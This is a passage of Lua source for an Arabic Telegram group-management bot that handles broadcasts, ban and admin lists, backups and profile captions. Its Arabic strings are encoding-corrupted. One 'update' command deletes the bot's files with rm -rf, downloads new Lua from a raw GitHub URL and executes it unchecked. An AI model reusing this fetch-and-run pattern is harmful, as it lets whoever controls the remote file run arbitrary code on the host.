send(msg.chat_id_, msg.id_,'*π₯βΏΨΉΨ―Ψ― Ψ§ΩΩΨ΄ΨͺΨ±ΩΩΩ Ψ§ΩΨ§Ω ~ '..#pv..'\nπβΏΨͺΩ Ψ§ΩΨΉΨ«ΩΨ± ΨΉΩΩ ~ '..sendok..' ΩΨ΄ΨͺΨ±Ω ΩΨ§Ω Ψ¨Ψ­ΨΈΨ± Ψ§ΩΨ¨ΩΨͺ\nββΏΨ§Ψ΅Ψ¨Ψ­ ΨΉΨ―Ψ― Ψ§ΩΩΨ΄ΨͺΨ±ΩΩΩ Ψ§ΩΨ§Ω ~ '..ok..' ΩΨ΄ΨͺΨ±Ω *')   
end
end
end,nil)
end,nil)
end
return false
end
if text == "ΨͺΩΨΈΩΩ ΩΨ§ΩΨ¬Ψ±ΩΨ¨Ψ§Ψͺ βΉ" then
local group = database:smembers(bot_id..'Tshake:Chek:Groups')  
local w = 0
local q = 0
for i = 1, #group do
tdcli_function({ID='GetChat',chat_id_ = group[i]
},function(arg,data)
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusMember" then
print('\27[30;34mΒ»Β» THE BOT IS NOT ADMIN β\nΒ»Β» '..group[i]..'\n\27[1;37m')
database:srem(bot_id..'Tshake:Chek:Groups',group[i])  
w = w + 1
end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusLeft" then
database:srem(bot_id..'Tshake:Chek:Groups',group[i])  
q = q + 1
print('\27[30;35mΒ»Β» THE BOT IS LEFT GROUP β\nΒ»Β» '..group[i]..'\n\27[1;37m')
end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusKicked" then
database:srem(bot_id..'Tshake:Chek:Groups',group[i])  
q = q + 1
print('\27[30;36mΒ»Β» THE BOT IS KICKED GROUP β\nΒ»Β» '..group[i]..'\n\27[1;37m')
end
if data and data.code_ and data.code_ == 400 then
database:srem(bot_id..'Tshake:Chek:Groups',group[i])  
w = w + 1
end
if #group == i then 
if (w + q) == 0 then
send(msg.chat_id_, msg.id_,'π₯βΏΩΨ§ ΨͺΩΨ¬Ψ― ΩΨ¬ΩΩΨΉΨ§Ψͺ ΩΩΩΩΩ ')   
else
local taha = (w + q)
local sendok = #group - taha
if q == 0 then
taha = ''
else
taha = '\nπ―βΏ ΨͺΩ Ψ§Ψ²Ψ§ΩΨ© ~ '..q..' ΩΨ¬ΩΩΨΉΨ§Ψͺ ΩΩ Ψ§ΩΨ¨ΩΨͺ'
end
if w == 0 then
storm = ''
else
storm = '\nπ―βΏ ΨͺΩ Ψ§Ψ²Ψ§ΩΨ© ~'..w..' ΩΨ¬ΩΩΨΉΩ ΩΨ§Ω Ψ§ΩΨ¨ΩΨͺ ΨΉΨΆΩ'
end
send(msg.chat_id_, msg.id_,'*π₯βΏ ΨΉΨ―Ψ― Ψ§ΩΩΨ¬ΩΩΨΉΨ§Ψͺ Ψ§ΩΨ§Ω ~ '..#group..' ΩΨ¬ΩΩΨΉΩ '..storm..''..taha..'\nπβΏΨ§Ψ΅Ψ¨Ψ­ ΨΉΨ―Ψ― Ψ§ΩΩΨ¬ΩΩΨΉΨ§Ψͺ Ψ§ΩΨ§Ω ~ '..sendok..' ΩΨ¬ΩΩΨΉΨ§Ψͺ*\n')   
end
end
end,nil)
end
return false
end
if text == 'ΨͺΩΨΉΩΩ Ψ§ΩΨ¨ΩΨͺ Ψ§ΩΨ?Ψ―ΩΩ π ' then
database:del(bot_id..'Tshake:Free:Add:Bots') 
send(msg.chat_id_, msg.id_,'\nβ«οΈβΏΨͺΩ ΨͺΩΨΉΩΩ Ψ§ΩΨ¨ΩΨͺ Ψ§ΩΨ?Ψ―ΩΩ ') 
end
if text == 'ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ¨ΩΨͺ Ψ§ΩΨ?Ψ―ΩΩ π?' then
database:set(bot_id..'Tshake:Free:Add:Bots',true) 
send(msg.chat_id_, msg.id_,'\nβ«οΈβΏΨͺΩ ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ¨ΩΨͺ Ψ§ΩΨ?Ψ―ΩΩ') 
end
if text=="Ψ§Ψ°Ψ§ΨΉΩ Ψ?Ψ§Ψ΅ π‘" and msg.reply_to_message_id_ == 0 then
if database:get(bot_id.."Tshake:Status:Bc") and not DevTshake(msg) then 
send(msg.chat_id_, msg.id_,"β«οΈβΏΨ§ΩΨ§Ψ°Ψ§ΨΉΩ ΩΨΉΨ·ΩΩ ΩΩ ΩΨ¨Ω Ψ§ΩΩΨ·ΩΨ± Ψ§ΩΨ§Ψ³Ψ§Ψ³Ω")
return false
end
database:setex(bot_id.."Tshake:Tshake:Bc:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_,"πβΏΨ§Ψ±Ψ³Ω ΩΩ Ψ³ΩΨ§Ψ‘ ~ { ΩΩΨ΅Ω, ΩΨͺΨ­Ψ±ΩΩ, Ψ΅ΩΨ±Ω, Ψ±Ψ³Ψ§ΩΩ }\nβ«οΈβΏΩΩΨ?Ψ±ΩΨ¬ Ψ§Ψ±Ψ³Ω Ψ§ΩΨΊΨ§Ψ‘ ") 
return false
end 
if text=="Ψ§Ψ°Ψ§ΨΉΩ π‘" and msg.reply_to_message_id_ == 0 then
if database:get(bot_id.."Tshake:Status:Bc") and not DevTshake(msg) then 
send(msg.chat_id_, msg.id_,"β«οΈβΏΨ§ΩΨ§Ψ°Ψ§ΨΉΩ ΩΨΉΨ·ΩΩ ΩΩ ΩΨ¨Ω Ψ§ΩΩΨ·ΩΨ± Ψ§ΩΨ§Ψ³Ψ§Ψ³Ω")
return false
end
database:setex(bot_id.."Tshake:Tshake:Bc:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_,"πβΏΨ§Ψ±Ψ³Ω ΩΩ Ψ³ΩΨ§Ψ‘ ~ { ΩΩΨ΅Ω, ΩΨͺΨ­Ψ±ΩΩ, Ψ΅ΩΨ±Ω, Ψ±Ψ³Ψ§ΩΩ }\nβ«οΈβΏΩΩΨ?Ψ±ΩΨ¬ Ψ§Ψ±Ψ³Ω Ψ§ΩΨΊΨ§Ψ‘ ") 
return false
end  
if text=="Ψ§Ψ°Ψ§ΨΉΩ Ψ¨Ψ§ΩΨͺΩΨ¬ΩΩ π₯" and msg.reply_to_message_id_ == 0  then
if database:get(bot_id.."Tshake:Status:Bc") and not DevTshake(msg) then 
send(msg.chat_id_, msg.id_,"β«οΈβΏΨ§ΩΨ§Ψ°Ψ§ΨΉΩ ΩΨΉΨ·ΩΩ ΩΩ ΩΨ¨Ω Ψ§ΩΩΨ·ΩΨ± Ψ§ΩΨ§Ψ³Ψ§Ψ³Ω")
return false
end
database:setex(bot_id.."Tshake:Tshake:Fwd:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_,"π βΏΨ§Ψ±Ψ³Ω ΩΩ Ψ§ΩΨͺΩΨ¬ΩΩ Ψ§ΩΨ§Ω") 
return false
end 
if text=="Ψ§Ψ°Ψ§ΨΉΩ Ψ¨Ψ§ΩΨͺΩΨ¬ΩΩ Ψ?Ψ§Ψ΅ π€" and msg.reply_to_message_id_ == 0  then
if database:get(bot_id.."Tshake:Status:Bc") and not DevTshake(msg) then 
send(msg.chat_id_, msg.id_,"β«οΈβΏΨ§ΩΨ§Ψ°Ψ§ΨΉΩ ΩΨΉΨ·ΩΩ ΩΩ ΩΨ¨Ω Ψ§ΩΩΨ·ΩΨ± Ψ§ΩΨ§Ψ³Ψ§Ψ³Ω")
return false
end
database:setex(bot_id.."Tshake:Tshake:Fwd:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_,"π βΏΨ§Ψ±Ψ³Ω ΩΩ Ψ§ΩΨͺΩΨ¬ΩΩ Ψ§ΩΨ§Ω") 
return false
end 
if text == "ΨͺΩΨΉΩΩ Ψ§ΩΨ§Ψ°Ψ§ΨΉΩ π" then
database:del(bot_id.."Tshake:Status:Bc") 
send(msg.chat_id_, msg.id_,"\nβ«οΈβΏΨͺΩ ΨͺΩΨΉΩΩ Ψ§ΩΨ§Ψ°Ψ§ΨΉΩ " ) 
return false
end 
if text == "ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ§Ψ°Ψ§ΨΉΩ π" then
database:set(bot_id.."Tshake:Status:Bc",true) 
send(msg.chat_id_, msg.id_,"\nβ«οΈβΏΨͺΩ ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ§Ψ°Ψ§ΨΉΩ") 
return false
end 
if text == "ΨͺΩΨΉΩΩ Ψ§ΩΩΨΊΨ§Ψ―Ψ±Ω π" then
database:del(bot_id.."Tshake:Left:Bot"..msg.chat_id_)  
send(msg.chat_id_, msg.id_,"β«οΈβΏΨͺΩ ΨͺΩΨΉΩΩ ΩΨΊΨ§Ψ―Ψ±Ψ© Ψ§ΩΨ¨ΩΨͺ") 
return false 
end
if text == "ΨͺΨΊΩΨ± Ψ§Ψ³Ω Ψ§ΩΨ¨ΩΨͺ π"  then 
if DevTshake(msg) then
database:setex(bot_id.."Tshake:Set:Name:Bot"..msg.sender_user_id_,300,true) 
send(msg.chat_id_, msg.id_,"β«οΈβΏ Ψ§Ψ±Ψ³Ω ΩΩ Ψ§ΩΨ§Ψ³Ω Ψ§ΩΨ§Ω ")  
end
return false
end
if text == "ΨͺΨΉΨ·ΩΩ Ψ§ΩΩΨΊΨ§Ψ―Ψ±Ω π" then
database:set(bot_id.."Tshake:Left:Bot"..msg.chat_id_,true)   
send(msg.chat_id_, msg.id_, "πβΏΨͺΩ ΨͺΨΉΨ·ΩΩ ΩΨΊΨ§Ψ―Ψ±Ψ© Ψ§ΩΨ¨ΩΨͺ") 
return false 
end
if text and database:get(bot_id..'Start:Bots') then
if text == 'Ψ§ΩΨΊΨ§Ψ‘ β' then   
send(msg.chat_id_, msg.id_,"πβΏΨͺΩ Ψ§ΩΨΊΨ§Ψ‘ Ψ­ΩΨΈ ΩΩΩΨ΄Ω Ψ³ΨͺΨ§Ψ±Ψͺ") 
database:del(bot_id..'Start:Bots') 
return false
end
database:set(bot_id.."Start:Bot",text)  
send(msg.chat_id_, msg.id_,'πβΏΨͺΩ Ψ­ΩΨΈ ΩΩΩΨ΄Ω Ψ³ΨͺΨ§Ψ±Ψͺ') 
database:del(bot_id..'Start:Bots') 
return false
end
if text == 'ΨΆΨΉ ΩΩΩΨ΄Ω Ψ³ΨͺΨ§Ψ±Ψͺ π§' then
database:set(bot_id..'Start:Bots',true) 
send(msg.chat_id_, msg.id_,'πβΏΨ§Ψ±Ψ³Ω ΩΩ Ψ§ΩΩΩΩΨ΄Ω Ψ§ΩΨ§Ω') 
return false
end
if text == 'Ψ­Ψ°Ω ΩΩΩΨ΄Ω Ψ³ΨͺΨ§Ψ±Ψͺ π' then
database:del(bot_id..'Start:Bot') 
send(msg.chat_id_, msg.id_,'πβΏΨͺΩ Ψ­Ψ°Ω ΩΩΩΨ΄Ω Ψ³ΨͺΨ§Ψ±Ψͺ') 
end
if text == ("ΩΨ³Ψ­ ΩΨ§Ψ¦ΩΩ Ψ§ΩΨΉΨ§Ω π ") and DevTshake(msg) then
database:del(bot_id.."Tshake:GBan:User")
send(msg.chat_id_, msg.id_, "\n??βΏΨͺΩ ΩΨ³Ψ­ ΩΨ§Ψ¦ΩΩ Ψ§ΩΨΉΨ§Ω")
return false
end
if text == ("ΩΨ³Ψ­ Ψ§ΩΩΨ·ΩΨ±ΩΩ πΈ") and DevTshake(msg) then
database:del(bot_id.."Tshake:Sudo:User")
send(msg.chat_id_, msg.id_, "\nπ βΏ ΨͺΩ ΩΨ³Ψ­ ΩΨ§Ψ¦ΩΨ© Ψ§ΩΩΨ·ΩΨ±ΩΩ  ")
end
if text == ("ΩΨ§Ψ¦ΩΩ Ψ§ΩΨΉΨ§Ω π·") and DevTshake(msg) then
local list = database:smembers(bot_id.."Tshake:GBan:User")
t = "\nββΏΩΨ§Ψ¦ΩΨ© Ψ§ΩΩΨ­ΨΈΩΨ±ΩΩ ΨΉΨ§Ω \nΒ«|β β‘β β‘β β‘β β‘β β‘β β‘β β‘β |Β» \n"
for k,v in pairs(list) do
local username = database:get(bot_id.."Tshake:User:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
else
t = t..""..k.."- (`"..v.."`)\n"
end
end
if #list == 0 then
t = "ββΏΩΨ§ ΩΩΨ¬Ψ― ΩΨ­ΨΈΩΨ±ΩΩ ΨΉΨ§Ω"
end
send(msg.chat_id_, msg.id_, t)
return false
end
if text == ("Ψ§ΩΩΨ·ΩΨ±ΩΩ π±") and DevTshake(msg) then
local list = database:smembers(bot_id.."Tshake:Sudo:User")
t = "\nββΏΩΨ§Ψ¦ΩΨ© ΩΨ·ΩΨ±ΩΩ Ψ§ΩΨ¨ΩΨͺ \nΒ«|β β‘β β‘β β‘β β‘β β‘β β‘β β‘β |Β» \n"
for k,v in pairs(list) do
local username = database:get(bot_id.."Tshake:User:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
else
t = t..""..k.."- (`"..v.."`)\n"
end
end
if #list == 0 then
t = "ββΏΩΨ§ ΩΩΨ¬Ψ― ΩΨ·ΩΨ±ΩΩ"
end
send(msg.chat_id_, msg.id_, t)
end
if text == 'Ψ¬ΩΨ¨ ΩΨ³Ψ?Ω Ψ§Ψ­ΨͺΩΨ§Ψ·ΩΩ π' then
local list = database:smembers(bot_id..'Tshake:Chek:Groups')  
local t = '{"BOT_ID": '..bot_id..',"GP_BOT":{'  
for k,v in pairs(list) do   
NAME = 'Tshake Chat'
ASAS = database:smembers(bot_id.."Tshake:Basic:Constructor"..v)
MNSH = database:smembers(bot_id.."Tshake:Constructor"..v)
MDER = database:smembers(bot_id.."Tshake:Manager"..v)
MOD = database:smembers(bot_id.."Tshake:Mod:User"..v)
link = database:get(bot_id.."Tshake:Link_Group"..v) or ''
if k == 1 then
t = t..'"'..v..'":{"Tshake":"'..NAME..'",'
else
t = t..',"'..v..'":{"Tshake":"'..NAME..'",'
end
if #ASAS ~= 0 then 
t = t..'"ASAS":['
for k,v in pairs(ASAS) do
if k == 1 then
t =  t..'"'..v..'"'
else
t =  t..',"'..v..'"'
end
end   
t = t..'],'
end
if #MOD ~= 0 then
t = t..'"MOD":['
for k,v in pairs(MOD) do
if k == 1 then
t =  t..'"'..v..'"'
else
t =  t..',"'..v..'"'
end
end   
t = t..'],'
end
if #MDER ~= 0 then
t = t..'"MDER":['
for k,v in pairs(MDER) do
if k == 1 then
t =  t..'"'..v..'"'
else
t =  t..',"'..v..'"'
end
end   
t = t..'],'
end
if #MNSH ~= 0 then
t = t..'"MNSH":['
for k,v in pairs(MNSH) do
if k == 1 then
t =  t..'"'..v..'"'
else
t =  t..',"'..v..'"'
end
end   
t = t..'],'
end
t = t..'"linkgroup":"'..link..'"}' or ''
end
t = t..'}}'
local File = io.open('./File_Libs/'..bot_id..'.json', "w")
File:write(t)
File:close()
sendDocument(msg.chat_id_, msg.id_,'./File_Libs/'..bot_id..'.json', 'π βΏ ΨΉΨ―Ψ― ΩΨ¬ΩΩΨΉΨ§Ψͺ Ψ§ΩΨͺΩ ΩΩ Ψ§ΩΨ¨ΩΨͺ { '..#list..'}')
end
if text == "ΨͺΨ­Ψ―ΩΨ« Ψ§ΩΨ³ΩΨ±Ψ³ π " then
send(msg.chat_id_,msg.id_,'ββΏΨͺΩ Ψ§ΩΨͺΨ­Ψ―ΩΨ«')
os.execute('rm -rf Tshake.lua')
os.execute('rm -rf start.lua')
download_to_file('https://raw.githubusercontent.com/amrjava/alfapro/main/Tshake.lua', 'Tshake.lua') 
download_to_file('https://raw.githubusercontent.com/amrjava/alfapro/main/start.lua', 'start.lua') 
dofile('Tshake.lua')  
return false
end
if text == "ΨͺΨ­Ψ―ΩΨ« β»" then
dofile("Tshake.lua")  
send(msg.chat_id_, msg.id_, "ββΏΨͺΩ Ψ§ΩΨͺΨ­Ψ―ΩΨ«")
end
end
end --- Chat_Type = 'UserBot' 
end
end
function tdcli_update_callback(data)
if data.ID == "UpdateNewCallbackQuery" then
tahaj = data
msg = data
local Chat_id = data.chat_id_
local Msg_id = data.message_id_
local msg_idd = Msg_id/2097152/0.5
local Text = data.payload_.data_
vardump(data)
if Text and Text:match('(.*)/ideengphoto') then
if tonumber(Text:match('(.*)/ideengphoto')) == tonumber(data.sender_user_id_) then
tdcli_function ({ID = "GetUserProfilePhotos",user_id_ = data.sender_user_id_,offset_ = 0,limit_ = 1},function(extra,taha,success) 
tdcli_function ({ID = "GetUser",user_id_ = data.sender_user_id_},function(arg,date) 
tdcli_function ({ID = "GetChatMember",chat_id_ = data.chat_id_,user_id_ = data.sender_user_id_},function(arg,deata) 
if deata.status_.ID == "ChatMemberStatusCreator" then 
rtpa = 'ΩΩΨ΄Ψ¦'
elseif deata.status_.ID == "ChatMemberStatusEditor" then 
rtpa = 'Ψ§Ψ―ΩΩ' 
elseif deata.status_.ID == "ChatMemberStatusMember" then 
rtpa = 'ΨΉΨΆΩ'
end
if deata.join_date_ ~= 0 then
tarek = os.date('%Y-%m-%d', deata.join_date_)
else
tarek = 'ΩΨ§ ΩΩΨ¬Ψ― ' 
end
if date.username_ then
UserName_User = '@'..date.username_
else
UserName_User = 'ΩΨ§ ΩΩΨ¬Ψ―'
end
local Id = data.sender_user_id_
local NumMsg = database:get(bot_id..'Tshake:messageUser'..data.chat_id_..':'..data.sender_user_id_) or 0
local TotalMsg = Total_message(NumMsg)
local Status_Gps = database:get(bot_id.."Tshake:Comd:New:rt:User:"..data.chat_id_..Id) or Get_Rank(Id,data.chat_id_)
local message_edit = database:get(bot_id..'Tshake:message_edit'..data.chat_id_..data.sender_user_id_) or 0
local Num_Games = database:get(bot_id.."Tshak:Add:Num"..data.chat_id_..data.sender_user_id_) or 0
local Add_Mem = database:get(bot_id.."Tshake:Add:Memp"..data.chat_id_..":"..data.sender_user_id_) or 0
local Total_Photp = (taha.total_count_ or 0)
local Texting = {
'Ψ?Ψ― ΩΨ³ΨͺΨ§ ΩΨΉΩΩΩΨ§ΨͺΩ Ψ§ΩΩ',
"Ψ?Ψ― Ψ¨Ψ§ΩΩ Ψ§ΩΨ§ΩΨ―Ω Ψ¨ΨͺΨ§ΨΉΩ ΩΩΩΨ²",
"Ψ§ΩΩΨ§ Ψ¨ΩΨ³ΩΩ ΨΉΩΩΩ ΩΨ¨Ψ΄Ω",
"Ψ§Ψ­ΩΨ§ ΩΨ³Ψ§ ΨΉΩΩΩ ΩΨ§Ψ¨Ψ§",
"ΩΨ΄ ΩΩΩΩΩ ΨΉΩΩΩ",
"Ψ΅ΩΨ±Ω ΩΩΩΨ¨Ω ΩΨ―",
}
local Description = Texting[math.random(#Texting)]
local texte = '\nβΉ | Id π¦Ή '..Id..'\nβΉ | UsErNaMe π¦Ή '..UserName_User..'\nβΉ | StAsT π¦Ή '..Status_Gps..'\nβΉ | MsGs π¦Ή'..NumMsg..' \nβΉ | Activity π¦Ή '..TotalMsg..'\nβΉ | GaMeS π¦Ή '..Num_Games..''
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'English', callback_data=data.sender_user_id_.."/ideengphoto"},{text = 'ΨΉΨ±Ψ¨Ω', callback_data=data.sender_user_id_.."/idearpphoto"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageCaption?chat_id='..Chat_id..'&caption='..URL.escape(texte)..'&message_id='..msg_idd..'&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end,nil)   
end,nil)   
end,nil)   
end
end
if Text and Text:match('(.*)/idearpphoto') then
if tonumber(Text:match('(.*)/idearpphoto')) == tonumber(data.sender_user_id_) then
tdcli_function ({ID = "GetUserProfilePhotos",user_id_ = data.sender_user_id_,offset_ = 0,limit_ = 1},function(extra,taha,success) 
tdcli_function ({ID = "GetUser",user_id_ = data.sender_user_id_},function(arg,date) 
tdcli_function ({ID = "GetChatMember",chat_id_ = data.chat_id_,user_id_ = data.sender_user_id_},function(arg,deata) 
if deata.status_.ID == "ChatMemberStatusCreator" then 
rtpa = 'ΩΩΨ΄Ψ¦'
elseif deata.status_.ID == "ChatMemberStatusEditor" then 
rtpa = 'Ψ§Ψ―ΩΩ' 
elseif deata.status_.ID == "ChatMemberStatusMember" then 
rtpa = 'ΨΉΨΆΩ'
end
if deata.join_date_ ~= 0 then
tarek = os.date('%Y-%m-%d', deata.join_date_)
else
tarek = 'ΩΨ§ ΩΩΨ¬Ψ― ' 
end
if date.username_ then
UserName_User = '@'..date.username_
else
UserName_User = 'ΩΨ§ ΩΩΨ¬Ψ―'
end

local Id = data.sender_user_id_
local NumMsg = database:get(bot_id..'Tshake:messageUser'..data.chat_id_..':'..data.sender_user_id_) or 0
local TotalMsg = Total_message(NumMsg)
local Status_Gps = database:get(bot_id.."Tshake:Comd:New:rt:User:"..data.chat_id_..Id) or Get_Rank(Id,data.chat_id_)
local message_edit = database:get(bot_id..'Tshake:message_edit'..data.chat_id_..data.sender_user_id_) or 0
local Num_Games = database:get(bot_id.."Tshak:Add:Num"..data.chat_id_..data.sender_user_id_) or 0
local Add_Mem = database:get(bot_id.."Tshake:Add:Memp"..data.chat_id_..":"..data.sender_user_id_) or 0
local Total_Photp = (taha.total_count_ or 0)
local Texting = {
'Ψ?Ψ― ΩΨ³ΨͺΨ§ ΩΨΉΩΩΩΨ§ΨͺΩ Ψ§ΩΩ',
"Ψ?Ψ― Ψ¨Ψ§ΩΩ Ψ§ΩΨ§ΩΨ―Ω Ψ¨ΨͺΨ§ΨΉΩ ΩΩΩΨ²",
"Ψ§ΩΩΨ§ Ψ¨ΩΨ³ΩΩ ΨΉΩΩΩ ΩΨ¨Ψ΄Ω",
"Ψ§Ψ­ΩΨ§ ΩΨ³Ψ§ ΨΉΩΩΩ ΩΨ§Ψ¨Ψ§",
"ΩΨ΄ ΩΩΩΩΩ ΨΉΩΩΩ",
"Ψ΅ΩΨ±Ω ΩΩΩΨ¨Ω ΩΨ―",
}
local Description = Texting[math.random(#Texting)]
local texte = '\nβΉ |Ψ§ΩΨ―ΩΩ  . '..Id..'\nβΉ | ΩΨΉΨ±ΩΩ  . '..UserName_User..'\nβΉ |Ψ±ΨͺΨ¨ΨͺΩ  . '..Status_Gps..'\nβΉ | Ψ±Ψ³Ψ§Ψ¦ΩΩ  . '..NumMsg..' \nβΉ | Ψ§ΩΨͺΩΨ§ΨΉΩ . '..TotalMsg..'\nβΉ |Ψ§ΩΨ§ΩΨΉΨ§Ψ¨  . '..Num_Games..''
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'English', callback_data=data.sender_user_id_.."/ideengphoto"},{text = 'ΨΉΨ±Ψ¨Ω', callback_data=data.sender_user_id_.."/idearpphoto"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageCaption?chat_id='..Chat_id..'&caption='..URL.escape(texte)..'&message_id='..msg_idd..'&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end,nil)   
end,nil)   
end,nil)   
end
end

if Text and Text:match('(%d+)/idearp1@(%d+)') then
local users = {string.match(Text,"^(%d+)/idearp1@(%d+)$")}
if tonumber(users[1]) == tonumber(data.sender_user_id_) then
tdcli_function ({ID = "GetUserProfilePhotos",user_id_ = users[2],offset_ = 0,limit_ = 1},function(extra,taha,success) 
tdcli_function ({ID = "GetUser",user_id_ = users[2]},function(arg,date) 
tdcli_function ({ID = "GetChatMember",chat_id_ = data.chat_id_,user_id_ = users[2]},function(arg,deata) 
if deata.status_.ID == "ChatMemberStatusCreator" then 
rtpa = 'ΩΩΨ΄Ψ¦'
elseif deata.status_.ID == "ChatMemberStatusEditor" then 
rtpa = 'Ψ§Ψ―ΩΩ' 
elseif deata.status_.ID == "ChatMemberStatusMember" then 
rtpa = 'ΨΉΨΆΩ'
end
if deata.join_date_ ~= 0 then
tarek = os.date('%Y-%m-%d', deata.join_date_)
else
tarek = 'ΩΨ§ ΩΩΨ¬Ψ― ' 
end
if date.username_ then
UserName_User = '@'..date.username_
else
UserName_User = 'ΩΨ§ ΩΩΨ¬Ψ―'
end

local Id = users[2]
local NumMsg = database:get(bot_id..'Tshake:messageUser'..data.chat_id_..':'..users[2]) or 0
local TotalMsg = Total_message(NumMsg)
local Status_Gps = database:get(bot_id.."Tshake:Comd:New:rt:User:"..data.chat_id_..Id) or Get_Rank(Id,data.chat_id_)
local message_edit = database:get(bot_id..'Tshake:message_edit'..data.chat_id_..users[2]) or 0
local Num_Games = database:get(bot_id.."Tshak:Add:Num"..data.chat_id_..users[2]) or 0
local Add_Mem = database:get(bot_id.."Tshake:Add:Memp"..data.chat_id_..":"..users[2]) or 0
local Total_Photp = (taha.total_count_ or 0)
local Texting = {
'Ψ?Ψ― ΩΨ³ΨͺΨ§ ΩΨΉΩΩΩΨ§ΨͺΩ Ψ§ΩΩ',
"Ψ?Ψ― Ψ¨Ψ§ΩΩ Ψ§ΩΨ§ΩΨ―Ω Ψ¨ΨͺΨ§ΨΉΩ ΩΩΩΨ²",
"Ψ§ΩΩΨ§ Ψ¨ΩΨ³ΩΩ ΨΉΩΩΩ ΩΨ¨Ψ΄Ω",
"Ψ§Ψ­ΩΨ§ ΩΨ³Ψ§ ΨΉΩΩΩ ΩΨ§Ψ¨Ψ§",
"ΩΨ΄ ΩΩΩΩΩ ΨΉΩΩΩ",
"Ψ΅ΩΨ±Ω ΩΩΩΨ¨Ω ΩΨ―",
}
local Description = Texting[math.random(#Texting)]
local texte = '\n*βΉ |Ψ§ΩΨ―ΩΩ  . '..Id..'\nβΉ | ΩΨΉΨ±ΩΩ  .* ['..UserName_User..']*\nβΉ |Ψ±ΨͺΨ¨ΨͺΩ  . '..Status_Gps..'\nβΉ | Ψ±Ψ³Ψ§Ψ¦ΩΩ  . '..NumMsg..' \nβΉ | Ψ§ΩΨͺΩΨ§ΨΉΩ . '..TotalMsg..'\nβΉ |Ψ§ΩΨ§ΩΨΉΨ§Ψ¨  . '..Num_Games..'*'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'English', callback_data=data.sender_user_id_.."/ideeng1@"..Id},{text = 'ΨΉΨ±Ψ¨Ω', callback_data=data.sender_user_id_.."/idearp1@"..Id},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(texte)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end,nil)   
end,nil)   
end,nil)   
return false
end
end

if Text and Text:match('(%d+)/ideeng1@(%d+)') then
local users = {string.match(Text,"^(%d+)/ideeng1@(%d+)$")}
if tonumber(users[1]) == tonumber(data.sender_user_id_) then
tdcli_function ({ID = "GetUserProfilePhotos",user_id_ = users[2],offset_ = 0,limit_ = 1},function(extra,taha,success) 
tdcli_function ({ID = "GetUser",user_id_ = users[2]},function(arg,date) 
tdcli_function ({ID = "GetChatMember",chat_id_ = data.chat_id_,user_id_ = users[2]},function(arg,deata) 
if deata.status_.ID == "ChatMemberStatusCreator" then 
rtpa = 'ΩΩΨ΄Ψ¦'
elseif deata.status_.ID == "ChatMemberStatusEditor" then 
rtpa = 'Ψ§Ψ―ΩΩ' 
elseif deata.status_.ID == "ChatMemberStatusMember" then 
rtpa = 'ΨΉΨΆΩ'
end
if deata.join_date_ ~= 0 then
tarek = os.date('%Y-%m-%d', deata.join_date_)
else
tarek = 'ΩΨ§ ΩΩΨ¬Ψ― ' 
end
if date.username_ then
UserName_User = '@'..date.username_
else
UserName_User = 'ΩΨ§ ΩΩΨ¬Ψ―'
end

local Id = users[2]
local NumMsg = database:get(bot_id..'Tshake:messageUser'..data.chat_id_..':'..users[2]) or 0
local TotalMsg = Total_message(NumMsg)
local Status_Gps = database:get(bot_id.."Tshake:Comd:New:rt:User:"..data.chat_id_..Id) or Get_Rank(Id,data.chat_id_)
local message_edit = database:get(bot_id..'Tshake:message_edit'..data.chat_id_..users[2]) or 0
local Num_Games = database:get(bot_id.."Tshak:Add:Num"..data.chat_id_..users[2]) or 0
local Add_Mem = database:get(bot_id.."Tshake:Add:Memp"..data.chat_id_..":"..users[2]) or 0
local Total_Photp = (taha.total_count_ or 0)
local Texting = {
'Ψ?Ψ― ΩΨ³ΨͺΨ§ ΩΨΉΩΩΩΨ§ΨͺΩ Ψ§ΩΩ',
"Ψ?Ψ― Ψ¨Ψ§ΩΩ Ψ§ΩΨ§ΩΨ―Ω Ψ¨ΨͺΨ§ΨΉΩ ΩΩΩΨ²",
"Ψ§ΩΩΨ§ Ψ¨ΩΨ³ΩΩ ΨΉΩΩΩ ΩΨ¨Ψ΄Ω",
"Ψ§Ψ­ΩΨ§ ΩΨ³Ψ§ ΨΉΩΩΩ ΩΨ§Ψ¨Ψ§",
"ΩΨ΄ ΩΩΩΩΩ ΨΉΩΩΩ",
"Ψ΅ΩΨ±Ω ΩΩΩΨ¨Ω ΩΨ―",
}
local Description = Texting[math.random(#Texting)]
local texte = '\n*βΉ | Id π¦Ή '..Id..'\nβΉ | UsErNaMe π¦Ή * ['..UserName_User..']*\nβΉ | StAsT π¦Ή '..Status_Gps..'\nβΉ | MsGs π¦Ή'..NumMsg..' \nβΉ | Activity π¦Ή '..TotalMsg..'\nβΉ | GaMeS π¦Ή '..Num_Games..'*'
keyboard = {} 
keyboard.inline_keyboard = {
{
